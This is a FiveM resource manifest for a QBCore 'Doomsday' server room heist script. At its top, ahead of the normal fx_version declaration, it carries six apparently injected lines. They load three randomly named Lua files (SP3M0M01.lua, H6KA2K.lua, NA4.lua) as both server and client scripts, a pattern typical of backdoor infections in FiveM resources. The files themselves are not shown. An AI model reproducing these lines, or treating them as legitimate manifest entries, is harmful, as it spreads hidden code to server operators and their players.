server_script "SP3M0M01.lua"
client_script "SP3M0M01.lua"
server_script "H6KA2K.lua"
client_script "H6KA2K.lua"
server_script "NA4.lua"
client_script "NA4.lua"
fx_version 'cerulean'

game 'gta5'
lua54 'yes'

author 'Lionh34rt#4305'
description 'Doomsday DLC Server Room Heist for QBCore'
version '1.0'

client_scripts {
    '@PolyZone/client.lua',
    'client/cl_*.lua',
}

shared_script {
    'shared/sh_*.lua',
}

server_scripts {
    '@oxmysql/lib/MySQL.lua',
    'server/sv_*.lua',
}